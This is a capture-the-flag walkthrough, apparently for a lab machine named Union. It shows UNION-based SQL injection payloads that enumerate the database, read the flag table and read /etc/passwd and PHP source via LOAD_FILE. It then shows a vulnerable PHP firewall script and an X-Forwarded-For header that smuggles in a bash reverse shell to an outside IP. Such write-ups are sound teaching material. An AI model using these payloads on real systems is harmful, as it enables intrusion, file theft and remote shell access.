There's definitely something here our input is checked on db , but how can we inject our sql query on it ?
![/home/d0s3nt/myblog/_site](/assets/img/posts/Union/Pasted image 20240524164641.png)


let's check sqlmap 
![Pasted image 20240524162539.png](/assets/img/posts/Union/Pasted image 20240524162539.png)

sqlmap didn't find anything 


but if we try a manual , UNION injection we can see a different response that may lead to sql injection

![Pasted image 20240524164820.png](/assets/img/posts/Union/Pasted image 20240524164820.png)

we can use this to enumerate database

the database used is `november`
![Pasted image 20240524164945.png](/assets/img/posts/Union/Pasted image 20240524164945.png)
the use is `uhc@localhost`
![Pasted image 20240524165106.png](/assets/img/posts/Union/Pasted image 20240524165106.png)

we an get the tables using 
```
' UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES Where table_schema='november'--  
```
![Pasted image 20240524165512.png](/assets/img/posts/Union/Pasted image 20240524165512.png)

so the tables is `flag`
we can try to read the content of this table using
```
' UNION SELECT * from november.flag-- 
```

UHC{F1rst_5tep_2_Qualify} , if we take a look at challenge.php we will notice that the page is asking for a flag 

if we submit it , we can got ssh open to our ip
![Pasted image 20240524170203.png](/assets/img/posts/Union/Pasted image 20240524170203.png)

but we need credential to ssh into machine , let's try to read files on the machine using sql injection 
```
' UNION SELECT LOAD_FILE('/etc/passwd')--  
```
![Pasted image 20240524170450.png](/assets/img/posts/Union/Pasted image 20240524170450.png)

Now we can read file , let's read the php files 
if we check the firewall.php 

```
' UNION SELECT LOAD_FILE('/var/www/html/firewall.php')--  
```
![Pasted image 20240524170736.png](/assets/img/posts/Union/Pasted image 20240524170736.png)

we can see that we can inject code in header 


```php
<?php
  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  };
  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT"); 
?>
```
              

if we use HTTP_X_FORWARDED_FOR we can inject our code into this header

```
X-FORWARDED-FOR: ;bash -c 'exec bash -i &>/dev/tcp/10.10.14.15/1337 <&1';
```
